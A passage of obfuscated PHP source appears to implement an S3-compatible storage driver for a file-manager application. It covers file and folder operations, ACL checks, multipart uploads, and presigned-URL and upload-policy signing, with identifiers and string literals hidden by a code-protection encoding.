$»üÙ‡š¤ = null; if (!$»üÙ‡š¤) { $»üÙ‡š¤ = strtoupper($this->getType()); } $®ı³òÒƒ = $»üÙ‡š¤ . $¶´í«úò[215] . $®ı³òÒƒ; if ($‚ê¹€é¬) { $®ùó„Çã = error_get_last(); if ($®ùó„Çã) { $®ı³òÒƒ = array($®ı³òÒƒ, $®ùó„Çã); } } write_log($®ı³òÒƒ, $¶´í«úò[216]); if ($œƒÂş¯ß) { throw new Exception($²ÌÅ¶ôš); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($€‹ÑùÙ ) { set_timeout(); require_once SDK_DIR . $_SERVER[‹‰”››ê][217]; parent::__construct(); $this->_init($€‹ÑùÙ ); } public function _init($Â˜˜¿Ç) { $•ÚÉ€ñí =& $_SERVER[‹‰”››ê]; $this->config = $Â˜˜¿Ç; foreach ($Â˜˜¿Ç as $±‡©‘öÁ => $ĞÑ±éï´) { if (isset($this->{$±‡©‘öÁ})) { $this->{$±‡©‘öÁ} = $ĞÑ±éï´; } } $this->endpoint = $Â˜˜¿Ç[$•ÚÉ€ñí[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $õ¶ƒâÎÃ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($õ¶ƒâÎÃ, 0, 7) == $•ÚÉ€ñí[219]) { $õ¶ƒâÎÃ = $•ÚÉ€ñí[220] . substr($õ¶ƒâÎÃ, 7); } $this->client->setEndpoint($õ¶ƒâÎÃ); if (in_array(ACTION, array($•ÚÉ€ñí[213], $•ÚÉ€ñí[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ÓÔÔÑÁú = "\166\x34") { $this->signVer = $ÓÔÔÑÁú; $this->client->setSignVersion($ÓÔÔÑÁú); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $»øûÏÆø) { return null; } } public function isBucketCors() { $€üÔ¡ã =& $_SERVER[‹‰”››ê]; $ğÓŞŞ° = $this->getBucketCors(); if (!$ğÓŞŞ° || !is_array($ğÓŞŞ°)) { return !1; } if (!is_array($ğÓŞŞ°[$€üÔ¡ã[221]])) { $ğÓŞŞ°[$€üÔ¡ã[221]] = explode($€üÔ¡ã[50], $ğÓŞŞ°[$€üÔ¡ã[221]]); } if ($ğÓŞŞ°[$€üÔ¡ã[222]] != $€üÔ¡ã[223] || !in_array($€üÔ¡ã[223], $ğÓŞŞ°[$€üÔ¡ã[221]])) { return !1; } $¯²–ÜÈÖ = array_map($€üÔ¡ã[224], $ğÓŞŞ°[$€üÔ¡ã[225]]); if (!is_array($¯²–ÜÈÖ)) { $¯²–ÜÈÖ = array(); } $¯´×ãÏ = array($€üÔ¡ã[226], $€üÔ¡ã[227], $€üÔ¡ã[228], $€üÔ¡ã[229], $€üÔ¡ã[230]); $‘Ë¸´•š = array_diff($¯´×ãÏ, $¯²–ÜÈÖ); return empty($‘Ë¸´•š); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ÔÎê±é, $Á¶íŞ‚ = '', $²ôè«§¹ = REPEAT_RENAME) { $æÙ¸‹ÌÛ = $this->setContent($ÔÎê±é, $Á¶íŞ‚); if ($æÙ¸‹ÌÛ !== !1) { return $this->getPathOuter($ÔÎê±é); } return !1; } public function mkdir($ë»Ùı‡Ó, $“ƒ™áÜõ = REPEAT_SKIP) { $ë¼Ì‹§Ö =& $_SERVER[‹‰”››ê]; if (empty($ë»Ùı‡Ó) && $ë»Ùı‡Ó !== $ë¼Ì‹§Ö[231]) { return !1; } if ($“ƒ™áÜõ && $this->_isFolder($ë»Ùı‡Ó)) { return $this->getPathOuter($ë»Ùı‡Ó); } $ÃÃ¹ÒÒú = $this->setContent($ë»Ùı‡Ó, $ë¼Ì‹§Ö[12], !0); if ($ÃÃ¹ÒÒú !== !1) { return $this->getPathOuter($ë»Ùı‡Ó); } return !1; } public function copyFile($å–²«‘, $éŠÒ, $ûã¸üä = array()) { $ßñ¶”¼ =& $_SERVER[‹‰”››ê]; $‘Ş‚’ö” = $this->objectMeta($å–²«‘); if (!$‘Ş‚’ö”) { return !1; } if ($‘Ş‚’ö”[$ßñ¶”¼[79]] <= 1024 * 1024 * 200) { $ğÖö»°‚ = $this->client->copyObject($this->bucket, $å–²«‘, $this->bucket, $éŠÒ, $ßñ¶”¼[232], $ûã¸üä); } else { $ğÖö»°‚ = $this->client->multiCopyObject($this->bucket, $å–²«‘, $this->bucket, $éŠÒ, $ûã¸üä); } $ğÖö»°‚ = $ğÖö»°‚ ? $this->getPathOuter($éŠÒ) : !1; return $ğÖö»°‚; } public function moveFile($ö”¼ğ†ú, $ÅÅÑÉ€Ú) { if ($this->copyFile($ö”¼ğ†ú, $ÅÅÑÉ€Ú)) { $this->delFile($ö”¼ğ†ú); return $this->getPathOuter($ÅÅÑÉ€Ú); } return !1; } public function delFile($Á–«Û³) { return $this->client->deleteObject($this->bucket, $Á–«Û³); } public function delFolder($û¯¯íà) { $Ù×ü‰ÊÂ =& $_SERVER[‹‰”››ê]; if (!$this->exist($û¯¯íà)) { return !0; } $this->listItemCache = !1; $›³«ç¸œ = $this->fileList($û¯¯íà); $this->listItemCache = !0; $ŠŒ®ÏºÀ = trim($û¯¯íà, $Ù×ü‰ÊÂ[8]) . $Ù×ü‰ÊÂ[8]; if (!empty($û¯¯íà) && $û¯¯íà !== $Ù×ü‰ÊÂ[231] && !in_array($ŠŒ®ÏºÀ, $›³«ç¸œ[$Ù×ü‰ÊÂ[85]])) { $›³«ç¸œ[$Ù×ü‰ÊÂ[85]][] = $ŠŒ®ÏºÀ; } $¥ÆôÙï = $this->delByBatch($›³«ç¸œ[$Ù×ü‰ÊÂ[86]]); if (!$¥ÆôÙï) { return !1; } $¥ÆôÙï = $this->delByBatch($›³«ç¸œ[$Ù×ü‰ÊÂ[85]]); if (!$¥ÆôÙï) { return !1; } return $this->delFile($ŠŒ®ÏºÀ); } private function delByBatch($‚¸Ö™İİ) { foreach (array_chunk($‚¸Ö™İİ, 1000) as $ûï¹ø“») { $§Éë»È = $this->client->deleteObjects($this->bucket, $ûï¹ø“»); if (!$§Éë»È) { return !1; } } return !0; } public function rename($³“İğ·â, $Š— Éò) { return $this->renameObject($³“İğ·â, $Š— Éò); } public function listPath($½òÃáçß, $»ÇëŞ¬® = false) { $«İú¡ê =& $_SERVER[‹‰”››ê]; $ æı¸ƒü = $this->fileList($½òÃáçß, $«İú¡ê[8], !0); foreach ($ æı¸ƒü[$«İú¡ê[85]] as $‚‹Ï„šØ => $ØåÉ¢¦û) { $ æı¸ƒü[$«İú¡ê[85]][$‚‹Ï„šØ] = $this->folderInfo($ØåÉ¢¦û, $»ÇëŞ¬®, $ØåÉ¢¦û); } foreach ($ æı¸ƒü[$«İú¡ê[86]] as $‚‹Ï„šØ => $ØåÉ¢¦û) { $ æı¸ƒü[$«İú¡ê[86]][$‚‹Ï„šØ] = $this->fileInfo($ØåÉ¢¦û[$«İú¡ê[32]], $»ÇëŞ¬®, $ØåÉ¢¦û); } return $ æı¸ƒü; } protected function infoChildren($•ßå¥Îñ, &$Ùâ´Èßí) { $“Å¶—£¤ =& $_SERVER[‹‰”››ê]; $³’æ’ = $this->fileList($•ßå¥Îñ, $“Å¶—£¤[12], !0); $Ùâ´Èßí[$“Å¶—£¤[81]] += count($³’æ’[$“Å¶—£¤[85]]); $Ùâ´Èßí[$“Å¶—£¤[80]] += count($³’æ’[$“Å¶—£¤[86]]); foreach ($³’æ’[$“Å¶—£¤[86]] as $ÛüÇı‰) { if (!$ÛüÇı‰ || !$ÛüÇı‰[$“Å¶—£¤[79]]) { continue; } $Ùâ´Èßí[$“Å¶—£¤[79]] += $ÛüÇı‰[$“Å¶—£¤[79]]; } } private function fileInfo($±¨§Ñœ’, $Ôñûè¢· = false, $Äìõö©è = array()) { $ùÎÛ´Îë =& $_SERVER[‹‰”››ê]; $ÖáªŸ§ = array($ùÎÛ´Îë[32] => $this->pathThis($±¨§Ñœ’), $ùÎÛ´Îë[87] => $this->getPathOuter($±¨§Ñœ’), $ùÎÛ´Îë[33] => $ùÎÛ´Îë[233], $ùÎÛ´Îë[169] => $this->ext($±¨§Ñœ’), $ùÎÛ´Îë[79] => isset($Äìõö©è[$ùÎÛ´Îë[79]]) ? $Äìõö©è[$ùÎÛ´Îë[79]] : 0); if ($Ôñûè¢·) { return $ÖáªŸ§; } $ÖáªŸ§[$ùÎÛ´Îë[234]] = $ÖáªŸ§[$ùÎÛ´Îë[88]] = 0; $ÖáªŸ§[$ùÎÛ´Îë[235]] = $ÖáªŸ§[$ùÎÛ´Îë[236]] = !0; if (empty($Äìõö©è)) { $Äìõö©è = $this->objectMeta($±¨§Ñœ’); if (!$Äìõö©è) { return $ÖáªŸ§; } } if (isset($Äìõö©è[$ùÎÛ´Îë[237]]) && $Äìõö©è[$ùÎÛ´Îë[237]]) { $ÖáªŸ§[$ùÎÛ´Îë[238]] = $Äìõö©è[$ùÎÛ´Îë[237]]; } if (isset($Äìõö©è[$ùÎÛ´Îë[207]])) { $ÖáªŸ§[$ùÎÛ´Îë[88]] = $Äìõö©è[$ùÎÛ´Îë[207]]; } if (isset($Äìõö©è[$ùÎÛ´Îë[79]])) { $ÖáªŸ§[$ùÎÛ´Îë[79]] = $Äìõö©è[$ùÎÛ´Îë[79]]; } return $ÖáªŸ§; } private function folderInfo($Õë®ˆ©¢, $Øş×õñÓ = false, $ªÈÒ»Ó« = array()) { $“Í…Îß =& $_SERVER[‹‰”››ê]; $éÓÎïÄ = array($“Í…Îß[32] => $this->pathThis($Õë®ˆ©¢), $“Í…Îß[87] => $this->getPathOuter($“Í…Îß[8] . $Õë®ˆ©¢), $“Í…Îß[33] => $“Í…Îß[78]); if ($Øş×õñÓ) { return $éÓÎïÄ; } $éÓÎïÄ[$“Í…Îß[234]] = $éÓÎïÄ[$“Í…Îß[88]] = 0; $éÓÎïÄ[$“Í…Îß[235]] = $éÓÎïÄ[$“Í…Îß[236]] = !0; if ($Õë®ˆ©¢ == $“Í…Îß[12]) { return $éÓÎïÄ; } if (empty($ªÈÒ»Ó«)) { $ªÈÒ»Ó« = $this->objectMeta(trim($Õë®ˆ©¢, $“Í…Îß[8]) . $“Í…Îß[8]); } if (isset($ªÈÒ»Ó«[$“Í…Îß[207]])) { $éÓÎïÄ[$“Í…Îß[234]] = $ªÈÒ»Ó«[$“Í…Îß[207]]; } return $éÓÎïÄ; } private function fileList($¹æÉË”, $àË‹Î§æ = '', $ºÀÈâ‹² = 0) { $á®©ÕŸÄ =& $_SERVER[‹‰”››ê]; $¸¨ø³µá = rtrim($¹æÉË”, $á®©ÕŸÄ[8]) . $á®©ÕŸÄ[8]; $çÇù¼ËŞ = $this->listObjs($¸¨ø³µá, null, null, $àË‹Î§æ); if (!$çÇù¼ËŞ) { return array($á®©ÕŸÄ[85] => array(), $á®©ÕŸÄ[86] => array()); } $åŒû¡Ï = $½Øı¼ãè = array(); foreach ($çÇù¼ËŞ[$á®©ÕŸÄ[239]] as $’ÆÎØÌ¡) { $©ô”¼î = $’ÆÎØÌ¡[$á®©ÕŸÄ[32]]; if ($©ô”¼î == $¸¨ø³µá) { continue; } $ÒÛé›»† = isset($’ÆÎØÌ¡[$á®©ÕŸÄ[79]]) ? $’ÆÎØÌ¡[$á®©ÕŸÄ[79]] : 0; $Óù¸©’ñ = $ÒÛé›»† == 0 && substr($©ô”¼î, strlen($©ô”¼î) - 1, 1) == $á®©ÕŸÄ[8] ? !0 : !1; $this->cacheMethodInfoSet($©ô”¼î, $Óù¸©’ñ, $’ÆÎØÌ¡); if ($Óù¸©’ñ) { $åŒû¡Ï[] = $©ô”¼î; continue; } $½Øı¼ãè[] = $ºÀÈâ‹² ? $’ÆÎØÌ¡ : $©ô”¼î; } foreach ($çÇù¼ËŞ[$á®©ÕŸÄ[240]] as $’ÆÎØÌ¡) { $åŒû¡Ï[] = $’ÆÎØÌ¡[$á®©ÕŸÄ[32]]; $this->cacheMethodInfoSet($’ÆÎØÌ¡[$á®©ÕŸÄ[32]], !0); } $this->cacheMethodInfoSet($¹æÉË”, !0); return array($á®©ÕŸÄ[85] => $åŒû¡Ï, $á®©ÕŸÄ[86] => $½Øı¼ãè); } private function listObjs($Œ‘ã“™İ, $•“öß¸ = null, $¶Ò²ç’ç = null, $Óë¬£‰ø = null) { $âÜŒ·“÷ =& $_SERVER[‹‰”››ê]; $Œ‘ã“™İ = trim($Œ‘ã“™İ, $âÜŒ·“÷[8]); $ùïıé = empty($Œ‘ã“™İ) && $Œ‘ã“™İ !== $âÜŒ·“÷[231] ? $âÜŒ·“÷[12] : $Œ‘ã“™İ . $âÜŒ·“÷[8]; return $this->client->getBucket($this->bucket, $ùïıé, $•“öß¸, $¶Ò²ç’ç, $Óë¬£‰ø, !0); } public function has($°¡´ş¬µ, $Ä«ËÀ‡ï = false, $ßÎĞ˜êÁ = true) { $óÂıÑ·ğ =& $_SERVER[‹‰”››ê]; $°¡´ş¬µ = trim($°¡´ş¬µ, $óÂıÑ·ğ[8]); $Š¦õ„©â = empty($°¡´ş¬µ) && $°¡´ş¬µ !== $óÂıÑ·ğ[231] ? $óÂıÑ·ğ[12] : $°¡´ş¬µ . $óÂıÑ·ğ[8]; $¦‹÷…ï‹ = null; $©“Ã‰ = 500; $ÉÚóìÇ€ = $óÂıÑ·ğ[8]; $¡­ß†úœ = $“ï¸”™‰ = array(); while (!0) { $µÕŸ¥É = $this->listObjs($°¡´ş¬µ, $¦‹÷…ï‹, $©“Ã‰, $ÉÚóìÇ€); if (!$µÕŸ¥É) { break; } $¦‹÷…ï‹ = $µÕŸ¥É[$óÂıÑ·ğ[241]]; $ÔĞâ²ÏŸ = $µÕŸ¥É[$óÂıÑ·ğ[239]]; $±°Ë©È™ = $µÕŸ¥É[$óÂıÑ·ğ[240]]; if (empty($ÔĞâ²ÏŸ) && empty($±°Ë©È™)) { break; } if (count($ÔĞâ²ÏŸ) == 1 && $ÔĞâ²ÏŸ[0][$óÂıÑ·ğ[32]] == $Š¦õ„©â) { break; } if ($Ä«ËÀ‡ï) { if (count($ÔĞâ²ÏŸ)) { $ÔĞâ²ÏŸ = array_column($ÔĞâ²ÏŸ, $óÂıÑ·ğ[32]); $¡­ß†úœ = array_merge($¡­ß†úœ, $ÔĞâ²ÏŸ); } if (count($±°Ë©È™)) { $±°Ë©È™ = array_column($±°Ë©È™, $óÂıÑ·ğ[32]); $“ï¸”™‰ = array_merge($“ï¸”™‰, $±°Ë©È™); } if ($¦‹÷…ï‹ === null) { break; } continue; } if ($ßÎĞ˜êÁ) { if (!empty($ÔĞâ²ÏŸ)) { if (count($ÔĞâ²ÏŸ) > 1 || isset($ÔĞâ²ÏŸ[0][$óÂıÑ·ğ[32]]) && $ÔĞâ²ÏŸ[0][$óÂıÑ·ğ[32]] != $Š¦õ„©â) { return !0; } } } else { if (!empty($±°Ë©È™)) { return !0; } } if ($¦‹÷…ï‹ === null) { break; } } if ($Ä«ËÀ‡ï) { $¡­ß†úœ = array_diff($¡­ß†úœ, array($Š¦õ„©â)); $¡­ß†úœ = count(array_unique($¡­ß†úœ)); $“ï¸”™‰ = count(array_unique($“ï¸”™‰)); return array($óÂıÑ·ğ[242] => $¡­ß†úœ, $óÂıÑ·ğ[243] => $“ï¸”™‰); } return !1; } public function listAll($À°÷“Âü) { $´æ„½¿ =& $_SERVER[‹‰”››ê]; $ÙéŠĞ­ = $this->fileList($À°÷“Âü, $´æ„½¿[12], !0); $ÍĞÎòı÷ = array_to_keyvalue($ÙéŠĞ­[$´æ„½¿[86]], $´æ„½¿[32]); foreach ($ÙéŠĞ­[$´æ„½¿[85]] as $Ğëƒ§Ôà) { if (is_string($Ğëƒ§Ôà)) { $ÍĞÎòı÷[$Ğëƒ§Ôà] = array($´æ„½¿[79] => 0); } } return $this->listAllFiles($À°÷“Âü, $ÍĞÎòı÷); } public function canRead($Õ¨°ÔÖœ) { $‹ñŠ‚‡‰ =& $_SERVER[‹‰”››ê]; $şÔõôóè = $this->client->getAccessControlPolicy($this->bucket, $Õ¨°ÔÖœ); if (!$şÔõôóè) { return !1; } return in_array($şÔõôóè, array($‹ñŠ‚‡‰[244], $‹ñŠ‚‡‰[245], $‹ñŠ‚‡‰[246])) ? !0 : !1; } public function canWrite($ııÇüÛâ) { $é­Ö‘÷ =& $_SERVER[‹‰”››ê]; $Ø»Ùƒ¶Ñ = $this->client->getAccessControlPolicy($this->bucket, $ııÇüÛâ); if (!$Ø»Ùƒ¶Ñ) { return !1; } return in_array($Ø»Ùƒ¶Ñ, array($é­Ö‘÷[244], $é­Ö‘÷[245])) ? !0 : !1; } public function getContent($Ä“ú¤ñò) { return $this->client->getObject($this->bucket, $Ä“ú¤ñò); } public function setContent($¤„€‹”, $õãÂ ‰Û = '', $Àğò‡Ìš = false) { $òÓÌÊ˜— =& $_SERVER[‹‰”››ê]; $¤„€‹” = $Àğò‡Ìš ? trim($¤„€‹”, $òÓÌÊ˜—[8]) . $òÓÌÊ˜—[8] : $¤„€‹”; $ÅíÓ°™ƒ = get_file_mime(get_path_ext($¤„€‹”)); $ÓÏÎ’Ï‰ = $this->client->putObject($õãÂ ‰Û, $this->bucket, $¤„€‹”, $òÓÌÊ˜—[232], array(), $ÅíÓ°™ƒ); if (!$ÓÏÎ’Ï‰) { return !1; } if ($Àğò‡Ìš) { return !0; } return $ÓÏÎ’Ï‰ ? !0 : !1; } public function fileSubstr($èèŸÅÍ¸, $øÊ×•ôæ, $Ïøïçã•) { $–ßç»ó† = $øÊ×•ôæ + $Ïøïçã• - 1; return $this->client->getObject($this->bucket, $èèŸÅÍ¸, array($_SERVER[‹‰”››ê][247] => "\142\x79\x74\145\x73\x3d{$øÊ×•ôæ}\55{$–ßç»ó†}")); } public function upload($áŸ‰¿Õ×, $»ÌÕ¡ì¢, $äØ×ËÎ’ = false, $Íà¯İÎ = REPEAT_REPLACE) { $ÏÙÛÌÍä =& $_SERVER[‹‰”››ê]; $Ä–íŸİ” = array($ÏÙÛÌÍä[248] => @md5_file($»ÌÕ¡ì¢)); $ÄÜÖí‹© = array($ÏÙÛÌÍä[249] => get_file_mime(get_path_ext($áŸ‰¿Õ×))); if (IO::size($»ÌÕ¡ì¢) <= 1024 * 1024 * 200) { $­Ò¶³…ß = $this->client->putObjectFile($»ÌÕ¡ì¢, $this->bucket, $áŸ‰¿Õ×, $ÏÙÛÌÍä[232], $Ä–íŸİ”, $ÄÜÖí‹©); return !empty($­Ò¶³…ß) ? $this->getPathOuter($áŸ‰¿Õ×) : !1; } $Ä¾±„ê® = $this->client->multiUploadObject($»ÌÕ¡ì¢, $this->bucket, trim($áŸ‰¿Õ×, $ÏÙÛÌÍä[8]), $Ä–íŸİ”, $ÄÜÖí‹©); return $Ä¾±„ê® ? $this->getPathOuter($áŸ‰¿Õ×) : !1; } public function download($²¥¾Œ™‰, $ØÍ†·Âµ) { if (!@is_dir($this->pathFather($ØÍ†·Âµ)) && !IO::mkdir($this->pathFather($ØÍ†·Âµ))) { return !1; } $áğæˆ† = $this->client->getObject($this->bucket, $²¥¾Œ™‰, array(), $ØÍ†·Âµ); return $áğæˆ† !== !1 ? $ØÍ†·Âµ : !1; } public function link($é¼Ï¶Šç, $³ƒ—Èö‰ = array()) { return $this->getPreSignedURL($é¼Ï¶Šç, 3600 * 12, $³ƒ—Èö‰); } private function getPreSignedURL($Úë—µó‰, $Ó–³Ìì, $Ì¾€…¡º = array(), $öœÖøÎ” = "\107\x45\124") { $ÙÈ¼µÉÚ =& $_SERVER[‹‰”››ê]; $Úë—µó‰ = trim($Úë—µó‰, $ÙÈ¼µÉÚ[8]); if ($this->signVer == $ÙÈ¼µÉÚ[250]) { return $this->client->getPreSignedV2URL($this->bucket, $Úë—µó‰, $Ó–³Ìì, $öœÖøÎ”, $Ì¾€…¡º); } return $this->client->getPreSignedV4URL($this->bucket, $Úë—µó‰, $Ó–³Ìì, array(), $öœÖøÎ”, $Ì¾€…¡º); } public function fileOut($èØ¼’ˆ, $Ğ¬ƒ¶ = false, $šŞ™ûæ = false, $’ÉØÁë¦ = '') { $ó®½÷µ =& $_SERVER[‹‰”››ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($èØ¼’ˆ, $Ğ¬ƒ¶, $šŞ™ûæ, $’ÉØÁë¦); } if (!$šŞ™ûæ) { $šŞ™ûæ = $this->pathThis($èØ¼’ˆ); } $€Ê–§Ç¤ = get_file_mime(get_path_ext($šŞ™ûæ)); if ($€Ê–§Ç¤ == $ó®½÷µ[251]) { return parent::fileOut($èØ¼’ˆ, $Ğ¬ƒ¶, $šŞ™ûæ, $’ÉØÁë¦); } $ºÁ©¬ÛÄ = array($ó®½÷µ[252] => $€Ê–§Ç¤); if ($Ğ¬ƒ¶) { $ºÁ©¬ÛÄ[$ó®½÷µ[253]] = $ó®½÷µ[254] . rawurlencode($šŞ™ûæ); } else { } $ıÃ÷‚µË = $this->link($èØ¼’ˆ, $ºÁ©¬ÛÄ); $this->fileOutLink($ıÃ÷‚µË); } public function fileOutServer($·Í´¬Ç, $¾íˆÊ¬ = false, $ ÄëÛÍ¡ = false, $ƒé©õ§í = '') { parent::fileOut($·Í´¬Ç, $¾íˆÊ¬, $ ÄëÛÍ¡, $ƒé©õ§í); } public function fileOutImageServer($Š÷äµ½…, $ÙŒ¸§ = 250) { parent::fileOutImage($Š÷äµ½…, $ÙŒ¸§); } public function hashMd5($¼—ö—†, $Ö¿†éÆ = '') { $‹»Ù»Œ¢ = $this->objectMeta($¼—ö—†); if (!$‹»Ù»Œ¢) { return !1; } $Ö¿†éÆ = $Ö¿†éÆ ? $Ö¿†éÆ : _get($‹»Ù»Œ¢, $_SERVER[‹‰”››ê][255]); return $Ö¿†éÆ; } public function uploadFormData($è÷º¹ì«, $¸«’¹ = 3600) { $Û‘œ¸¯¢ =& $_SERVER[‹‰”››ê]; if (!$this->_isClientAsync()) { $ä´ÀŠ” = $this->getPreSignedURL($è÷º¹ì«, $¸«’¹, array(), $Û‘œ¸¯¢[256]); return array($Û‘œ¸¯¢[209] => str_replace($Û‘œ¸¯¢[219], $Û‘œ¸¯¢[257], $ä´ÀŠ”)); } if (isset($GLOBALS[$Û‘œ¸¯¢[6]][$Û‘œ¸¯¢[92]][$Û‘œ¸¯¢[258]]) && $GLOBALS[$Û‘œ¸¯¢[6]][$Û‘œ¸¯¢[92]][$Û‘œ¸¯¢[258]] == $Û‘œ¸¯¢[231]) { return $this->uploadMultiData($è÷º¹ì«, $¸«’¹); } if ($this->signVer == $Û‘œ¸¯¢[250]) { return $this->uploadFormDataV2($è÷º¹ì«, $¸«’¹); } return $this->uploadFormDataV4($è÷º¹ì«, $¸«’¹); } public function uploadFormDataV2($Ö¡ª—µÜ, $îò²ı° = 3600) { $­ºã«´ =& $_SERVER[‹‰”››ê]; $šã®Ö¯¦ = $this->pathFather($Ö¡ª—µÜ); $·¨¹Ì›Œ = $this->client->getHttpUploadPostParams($this->bucket, $šã®Ö¯¦, $­ºã«´[232], $îò²ı°); $©ìßëåû = array_merge((array) $·¨¹Ì›Œ, array($­ºã«´[259] => $­ºã«´[250], $­ºã«´[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($©ìßëåû[$­ºã«´[259]]); } return $©ìßëåû; } public function uploadFormDataV4($ª“°ÁÏ¡, $‚ÛÑğ»­ = 3600) { $¿¼ô„å· =& $_SERVER[‹‰”››ê]; $ÛÊğÎà = $¿¼ô„å·[232]; $²ßáŞòã = $¿¼ô„å·[260]; $‘›üØ = $¿¼ô„å·[62]; $Ú•õÀ±ü = gmdate($¿¼ô„å·[261]); $ÉÌ¤˜³» = gmdate($¿¼ô„å·[262]); $œ‘•…ñ• = $¿¼ô„å·[263]; $éô¼èÑ¦ = $‚ÛÑğ»­ . $¿¼ô„å·[12]; $½£Î¢™ = $¿¼ô„å·[264]; $ô¯Ó„Î = array($this->accessKey, $ÉÌ¤˜³», $this->region, $‘›üØ, $œ‘•…ñ•); $—‰õ€Çı = implode($¿¼ô„å·[8], $ô¯Ó„Î); $Œ•üª¥Ö = array($¿¼ô„å·[265] => gmdate($¿¼ô„å·[266], strtotime($¿¼ô„å·[267])), $¿¼ô„å·[268] => array(array($¿¼ô„å·[269] => $this->bucket), array($¿¼ô„å·[270], $¿¼ô„å·[271], $¿¼ô„å·[12]), array($¿¼ô„å·[270], $¿¼ô„å·[272], $¿¼ô„å·[12]), array($¿¼ô„å·[273] => $½£Î¢™), array($¿¼ô„å·[274] => $—‰õ€Çı), array($¿¼ô„å·[275] => $²ßáŞòã), array($¿¼ô„å·[276] => $Ú•õÀ±ü), array($¿¼ô„å·[277] => $éô¼èÑ¦))); $óÑ½¼¥Ø = base64_encode(json_encode($Œ•üª¥Ö)); $ËÛ‚Ş¬« = hash_hmac($¿¼ô„å·[278], $ÉÌ¤˜³», $¿¼ô„å·[279] . $this->secret, !0); $­ŸêÙšì = hash_hmac($¿¼ô„å·[278], $this->region, $ËÛ‚Ş¬«, !0); $Š‹× â€ = hash_hmac($¿¼ô„å·[278], $‘›üØ, $­ŸêÙšì, !0); $¨­çø¶Ú = hash_hmac($¿¼ô„å·[278], $œ‘•…ñ•, $Š‹× â€, !0); $ÜìĞ÷ˆ = hash_hmac($¿¼ô„å·[278], $óÑ½¼¥Ø, $¨­çø¶Ú); $§±ÈË¾’ = array($¿¼ô„å·[249] => $¿¼ô„å·[12], $¿¼ô„å·[273] => $½£Î¢™, $¿¼ô„å·[280] => $óÑ½¼¥Ø, $¿¼ô„å·[274] => $—‰õ€Çı, $¿¼ô„å·[275] => $²ßáŞòã, $¿¼ô„å·[276] => $Ú•õÀ±ü, $¿¼ô„å·[277] => $éô¼èÑ¦, $¿¼ô„å·[281] => $ÜìĞ÷ˆ, $¿¼ô„å·[259] => $¿¼ô„å·[250], $¿¼ô„å·[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($§±ÈË¾’[$¿¼ô„å·[259]]); } return $§±ÈË¾’; } public function uploadMultiData($²ÈéŞ», $Ã¯ğ‚Áğ = 3600) { $ĞÛš±ôî =& $_SERVER[‹‰”››ê]; $ºÙÁÕ¦’ = $this->signVer == $ĞÛš±ôî[250] ? gmdate($ĞÛš±ôî[282]) : gmdate($ĞÛš±ôî[283]); $ûéë«Ü© = array(); $£ĞÃ¥„ = $this->client->getUploadId($this->bucket, $²ÈéŞ», $ûéë«Ü©); if (!$£ĞÃ¥„) { return !1; } $‚âæ­Û× = array($ĞÛš±ôî[284] => $£ĞÃ¥„, $ĞÛš±ôî[209] => $this->getHost() . $ĞÛš±ôî[8] . $this->pathEncode($²ÈéŞ»), $ĞÛš±ôî[285] => $ºÙÁÕ¦’, $ĞÛš±ôî[97] => $²ÈéŞ», $ĞÛš±ôî[259] => $this->signVer); if ($this->_isClientAsync()) { unset($‚âæ­Û×[$ĞÛš±ôî[259]]); } return $‚âæ­Û×; } public function uploadMultiAuth($ ñ°ıÉü, $ÕÖ¤“ı» = array()) { $ Çì˜¸™ =& $_SERVER[‹‰”››ê]; if ($this->signVer == $ Çì˜¸™[250]) { if (isset($ÕÖ¤“ı»[$ Çì˜¸™[286]])) { return $this->uploadPartAuthV2($ ñ°ıÉü, $ÕÖ¤“ı»); } return $this->uploadListAuthV2($ ñ°ıÉü, $ÕÖ¤“ı»); } if (isset($ÕÖ¤“ı»[$ Çì˜¸™[286]])) { return $this->uploadPartAuthV4($ ñ°ıÉü, $ÕÖ¤“ı»); } return $this->uploadListAuthV4($ ñ°ıÉü, $ÕÖ¤“ı»); } public function uploadPartAuthV2($ÇÊ‘¾åâ, $œ„­èÛí = array()) { $­†»İ›¾ =& $_SERVER[‹‰”››ê]; $åî¡ö¶¬ = $œ„­èÛí[$­†»İ›¾[97]]; $š¨ö÷¾ = gmdate($­†»İ›¾[282]); $ıİİÍäÒ = array_intersect_key($œ„­èÛí, array_flip(array($­†»İ›¾[286], $­†»İ›¾[284]))); ksort($ıİİÍäÒ); $„½ë¬ = $ıİİÍäÒ ? $­†»İ›¾[76] . http_build_query($ıİİÍäÒ, null, $­†»İ›¾[287], PHP_QUERY_RFC3986) : $­†»İ›¾[12]; $Ç¤™äºÎ = array($­†»İ›¾[256], $­†»İ›¾[12], $­†»İ›¾[123], $­†»İ›¾[12], "\x78\55\141\155\172\x2d\x64\141\x74\x65\72{$š¨ö÷¾}", $­†»İ›¾[8] . $this->bucket . $­†»İ›¾[8] . $this->pathEncode($åî¡ö¶¬) . $„½ë¬); $”¸Á€ÀÚ = implode($­†»İ›¾[288], $Ç¤™äºÎ); $™×‹ÙÈ = $this->client->__getSignature($”¸Á€ÀÚ); return array($­†»İ›¾[289] => $™×‹ÙÈ, $­†»İ›¾[285] => $š¨ö÷¾); } public function uploadListAuthV2($º’İëËˆ, $ÖÜ‘¡šä = array()) { $İĞüŸ”¢ =& $_SERVER[‹‰”››ê]; $¾º¿µÊÀ = $ÖÜ‘¡šä[$İĞüŸ”¢[97]]; $ÌÖ¥Öç = $ÖÜ‘¡šä[$İĞüŸ”¢[284]]; $¥¥Íà¡ş = $this->client->listParts($this->bucket, $¾º¿µÊÀ, $ÌÖ¥Öç); if (!$¥¥Íà¡ş) { return !1; } $Ø×‹¨ = gmdate($İĞüŸ”¢[282]); $¦±ö ‡Ú = $İĞüŸ”¢[290] . $ÌÖ¥Öç; $Û¸­ä“£ = array($İĞüŸ”¢[291], 